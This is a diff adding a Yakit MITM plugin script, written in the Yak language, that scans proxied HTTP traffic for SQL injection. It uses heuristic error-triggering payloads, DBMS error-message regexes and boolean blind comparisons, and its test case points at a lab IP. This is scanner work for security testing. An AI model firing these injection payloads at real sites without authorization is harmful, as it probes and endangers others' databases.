@@ -1,0 +1,359 @@
+# mitm plugin template
+
+
+statusLock = sync.NewLock()
+CHECKED_TOTAL = 0
+FINISHED_TOTAL = 0
+VULN_COUNT = 0
+
+addVul = func() {
+    statusLock.Lock()
+    defer statusLock.Unlock()
+
+    VULN_COUNT ++
+    yakit_status("疑似SQL注入检出", VULN_COUNT)
+}
+
+
+addTaskCount = func() {
+    statusLock.Lock()
+    defer statusLock.Unlock()
+
+    CHECKED_TOTAL++
+    yakit_status("完成检查/流经请求总量", sprintf("%v/%v", FINISHED_TOTAL, CHECKED_TOTAL))
+}
+finishTaskCount = func() {
+    statusLock.Lock()
+    defer statusLock.Unlock()
+
+    FINISHED_TOTAL++
+    yakit_status("完成检查/流经请求总量", sprintf("%v/%v", FINISHED_TOTAL, CHECKED_TOTAL))
+}
+
+/*
+    generate a payload may case database error...
+*/
+heuristic_list = [`)`, `(`, `'`, `"`];
+prefix_letters = "123456789"
+all_digital_letters = "0123456789"
+sampleDigitalNumber = func() {
+    raw = ""
+    for i := 0; i < 4; i++ {
+        raw += string(prefix_letters[randn(0, len(prefix_letters))])
+    }
+    return raw
+}
+
+sampleHeuristicPayload = func() {
+    for {
+        raw = ""
+        for i=0; i<len(heuristic_list); i++ {
+            raw += heuristic_list[randn(0, 4)]
+        }
+        if str.Count(raw, "'") == 1 {
+            return raw
+        }
+    }
+}
+// 启发式检测，一般如果有问题，会检测出数据库异常
+getHeuristicPayload = func() {
+    return sampleDigitalNumber() + sampleHeuristicPayload() + str.RandStr(6)
+}
+
+// 判断是不是纯数字
+isDigital = func(s) {
+    if s == "" {
+        return false
+    }
+    for _, i = range s {
+        if !str.Contains(all_digital_letters, string(i)) {
+            return false
+        }
+    }
+    return true
+}
+
+#--------------------------WORKSPACE-----------------------------
+__test__ = func() {
+    for _, u = range [
+        // "http://172.16.86.134/sqli/example1.php?name=root",
+        // "http://172.16.86.134/sqli/example2.php?name=root",
+        // "http://172.16.86.134/sqli/example3.php?name=root",
+        "http://172.16.86.134/sqli/example4.php?id=2",
+        // "http://172.16.86.134/sqli/example5.php?id=2",
+        // "http://172.16.86.134/sqli/example6.php?id=2",
+        // "http://172.16.86.134/sqli/example7.php?id=2",
+    ] {
+        results, err := yakit.GenerateYakitMITMHooksParams("GET", u)
+        if err != nil {
+            return
+        }
+        isHttps, url, reqRaw, rspRaw, body = results
+
+        mirrorNewWebsitePathParams(results...)
+
+    }
+    
+}
+
+PREFIXES, SUFFIXES = [" ", ") ", "' ", "') "], ["", "-- -", "#", "%%16"]            # prefix/suffix values used for building testing blind payloads
+TAMPER_SQL_CHAR_POOL = [`(`, `)`, `'`, `"`]                               # characters used for SQL tampering/poisoning of parameter values
+BOOLEAN_TESTS = ["AND %d=%d", "OR NOT (%d>%d)"]                                     # boolean tests used for building testing blind payloads
+COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                             # optional HTTP header names
+GET, POST = "GET", "POST"                                                           # enumerator-like values used for marking current phase
+TEXT, HTTPCODE, TITLE, HTML = 0, 1, 2, 3                                            # enumerator-like values used for marking content type
+FUZZY_THRESHOLD = 0.95                                                              # ratio value in range (0,1) used for distinguishing True from False responses
+TIMEOUT = 30                                                                        # connection timeout in seconds
+RANDINT = 34453                                                                     # random integer value used across all tests
+BLOCKED_IP_REGEX = `(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)`  # regular expression used for recognition of generic firewall blocking messages
+
+
+DBMS_ERRORS = {
+    "MySQL": [`SQL syntax.*MySQL`, `Warning.*mysql_.*`, `valid MySQL result`, `MySqlClient\.`],
+    "PostgreSQL": [`PostgreSQL.*ERROR`, `Warning.*\Wpg_.*`, `valid PostgreSQL result`, `Npgsql\.`],
+    "Microsoft SQL Server": [`Driver.* SQL[\-\_\ ]*Server`, `OLE DB.* SQL Server`, `(\W|\A)SQL Server.*Driver`, `Warning.*mssql_.*`, `(\W|\A)SQL Server.*[0-9a-fA-F]{8}`, `(?s)Exception.*\WSystem\.Data\.SqlClient\.`, `(?s)Exception.*\WRoadhouse\.Cms\.`],
+    "Microsoft Access": [`Microsoft Access Driver`, `JET Database Engine`, `Access Database Engine`],
+    "Oracle": [`\bORA-[0-9][0-9][0-9][0-9]`, `Oracle error`, `Oracle.*Driver`, `Warning.*\Woci_.*`, `Warning.*\Wora_.*`],
+    "IBM DB2": [`CLI Driver.*DB2`, `DB2 SQL error`, `\bdb2_\w+\(`],
+    "SQLite": [`SQLite/JDBCDriver`, `SQLite.Exception`, `System.Data.SQLite.SQLiteException`, `Warning.*sqlite_.*`, `Warning.*SQLite3::`, `\[SQLITE_ERROR\]`],
+    "Sybase": [`(?i)Warning.*sybase.*`, `Sybase message`, `Sybase.*Server message.*`],
+}
+
+SIMILARITY_RITIO = 0.999
+
+checkNumbericParam = func(param, originValue, originResponse) {
+    defer func{
+        err := recover()
+        if err != nil {
+            yakit_output(err.Error())
+        }
+    }
+
+    rand1 = randn(1, 20000)
+    positivePayload = sprintf("%v AND %v=%v", originValue, rand1, rand1)
+    negativePayload = sprintf("%v AND %v=%v", originValue, rand1, rand1+1)
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst()
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return
+    }
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst()
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return
+    }
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return
+    }
+
+    opResult, err := str.CalcTextMaxSubStrStability(bodyOrigin, pBody)
+    if err != nil {
+        return false
+    }
+    if opResult < SIMILARITY_RITIO {
+        REASON = sprintf("参数为数字时，假定没有引号边界，[%v]与原参数结果不相同", positivePayload)
+        yakit_output(REASON)
+        return
+    }
+
+    pnResult, err := str.CalcTextMaxSubStrStability(pBody, nBody)
+    if err != nil {
+        return false
+    }
+    if pnResult > SIMILARITY_RITIO {
+        reason = "参数为数字时，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同"
+        reason = sprintf("参数为数字时，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同", positivePayload, negativePayload)
+        yakit_output(reason)
+        return
+    }
+
+    addVul()
+    yakit_output(sprintf("疑似检出 SQL 注入 [%v:%v]", param.Name(), originValue))
+
+    risk.NewRisk(res.Url, risk.title(
+        sprintf("Maybe SQL Injection: [param(%v) - type:number value:%v no-boundary]", param.Name(), originValue),
+    ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：数字型[%v] 无边界闭合】", originValue)), risk.type("sqlinjection"), risk.payload(negativePayload), risk.parameter(param.Name()), risk.details({
+        "url": res.Url,
+        "responseRaw": codec.StrconvQuote(string(res.ResponseRaw)),
+        "positive_payload": positivePayload,
+        "negative_payload": negativePayload,
+        "origin_value": param.Value(),
+        "param_name": param.Name(),
+        "param_position": param.Position(),
+        "param_position_verbose": param.PositionVerbose(),
+    }))
+    return true
+}
+
+
+checkWordParam = func(param, originValue, originResponse) {
+    rand1 = randn(1, 20000)
+    positivePayload = sprintf("%v'AND'%v'='%v", originValue, originValue, originValue)
+    negativePayload = sprintf("%v'AND'%v'='%v", originValue, originValue, str.RandStr(len(originValue)))
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst()
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return
+    }
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst()
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return
+    }
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return
+    }
+
+    opResult, err := str.CalcTextMaxSubStrStability(bodyOrigin, pBody)
+    if err != nil {
+        return false
+    }
+    if opResult < SIMILARITY_RITIO {
+        REASON = sprintf("参数为字符串，假定引号边界，[%v]与原参数结果不相同", positivePayload)
+        yakit_output(REASON)
+        return
+    }
+
+    pnResult, err := str.CalcTextMaxSubStrStability(pBody, nBody)
+    if err != nil {
+        return false
+    }
+    if pnResult > SIMILARITY_RITIO {
+        reason = sprintf("参数为字符串，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v", positivePayload, negativePayload, pnResult)
+        yakit_output(reason)
+        return
+    }
+
+    addVul()
+    yakit_output(sprintf("疑似检出 SQL 注入 [%v:%v]", param.Name(), originValue))
+
+    risk.NewRisk(res.Url, risk.title(
+        sprintf("Maybe SQL Injection: [param - type:str value:%v single-quote]", originValue),
+    ), risk.titleVerbose(sprintf("疑似SQL注入：【参数：字符型[%v] 单引号闭合】", originValue)), risk.type("sqlinjection"), risk.payload(codec.StrconvQuote(negativePayload)), risk.parameter(param.Name()), risk.details({
+        "url": res.Url,
+        "responseRaw": codec.StrconvQuote(string(res.ResponseRaw)),
+        "positive_payload": positivePayload,
+        "negative_payload": negativePayload,
+        "origin_value": param.Value(),
+        "param_name": param.Name(),
+        "param_position": param.Position(),
+        "param_position_verbose": param.PositionVerbose(),
+    }))
+    return true
+}
+
+
+# mirrorHTTPFlow 会镜像所有的流量到这里，包括 .js / .css / .jpg 这类一般会被劫持程序过滤的请求
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    addTaskCount()
+    defer finishTaskCount()
+
+    freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
+    if err != nil {
+        yakit_output(err.Error())
+        return
+    }
+    for _, param = range freq.GetCommonParams() {
+        payload := getHeuristicPayload()
+        result, err = param.Fuzz(payload).ExecFirst()
+        if err != nil {
+            yakit_output("执行 Error-Based SQL Injection Payload 失败")
+        }
+
+        // 首先检测是否有数据包报错
+        for DBMS, regexps = range DBMS_ERRORS {
+            if str.MatchAnyOfRegexp(result.ResponseRaw, regexps...) {
+                yakit_output("Heuristic Payload Found ERROR Based SQLi ...")
+                codecPayload = codec.StrconvQuote(string(payload))
+                addVul()
+                risk.NewRisk(
+                    result.Url, 
+                    risk.title(str.f("ERROR-Based SQL Injection: [%v:%v] Guess DBMS: %v", param.Name(), param.Value(), DBMS)),
+                    risk.titleVerbose(str.f("基于错误的 SQL 注入: [参数名:%v 原值:%v] 猜测数据库类型: %v", param.Name(), param.Value(), DBMS)),
+                    risk.type("sqlinjection"), risk.payload(codecPayload), risk.parameter(param.Name()),
+                    risk.details({
+                        "url": result.Url,
+                        "responseRaw": codec.StrconvQuote(string(rresultes.ResponseRaw)),
+                        "payload": codecPayload,
+                        "positive_payload": codecPayload,
+                        "negative_payload": codecPayload,
+                        "origin_value": param.Value(),
+                        "param_name": param.Name(),
+                        "param_position": param.Position(),
+                        "param_position_verbose": param.PositionVerbose(),
+                    }),
+                )
+                break
+            }
+        }
+
+        originValue = sprint(param.Value())
+        if len(param.Value()) > 0 {
+            originValue = param.Value()[0]
+        }
+
+        originResult, err = param.Fuzz(originValue).ExecFirst()
+        if err != nil {
+            yakit_output(sprintf("基准请求创建失败：%v", err))
+            continue
+        }
+
+        // 判断原值是一个纯数字？
+        numric := str.MatchAllOfRegexp(originValue, `\d+`)
+
+        // 然后根据参数的类型选择检测方法
+        // 数字型：
+        //     如果是数字的话，原来数字+字符串或者单引号内容不变的话，基本就没啥希望 测试可以使用 AND 1=1 来尝试
+        //     如果数字+字符串/单引号内容变了，说明问题比较大
+        // 字母型
+        //.    一般来说边界是 ' 的话， 通过 '# '%20--%20 或者 'AND 1=1-- 均可以判断，但是要注意一个问题：注释会导致过多条件被忽略
+        // 字段名 - 排序位常见（asc / desc）, 这种情况暂时先不做了
+        //     有可能是以反引号包含，但是这种情况一般不太需要考虑反引号闭合，这种闭合比较少见，但是检测方案很简单 //https://pentesterlab.com/exercises/web_for_pentester/course 
+        //.    如何证明一个字段排序是有问题提的？这种情况一般有两个
+        // 
+        if numric {
+            result = sprint(checkNumbericParam(param, originValue, originResult))
+            if result != "true" {
+                checkNumbericParam(param, originValue + "\n", originResult)
+            }
+        }
+
+        if sprint(checkWordParam(param, originValue, originResult)) != "true" {
+            checkWordParam(param, originValue + "\n", originResult)
+        }
+    }
+}
+
+/*
+type palm/common/mutate.(FuzzHTTPRequestParam) struct {
+  StructMethods(结构方法/函数):
+  PtrStructMethods(指针结构方法/函数):
+      func Fuzz(v1 ...interface {}) return(mutate.FuzzHTTPRequestIf)
+      func IsCookieParams() return(bool)
+      func IsGetParams() return(bool)
+      func IsPostParams() return(bool)
+      func Name() return(string)
+      func Position() return(string)
+      func PositionVerbose() return(string)
+      func Repeat(v1: int) return(mutate.FuzzHTTPRequestIf)
+      func Value() return(interface {})
+}
+*/
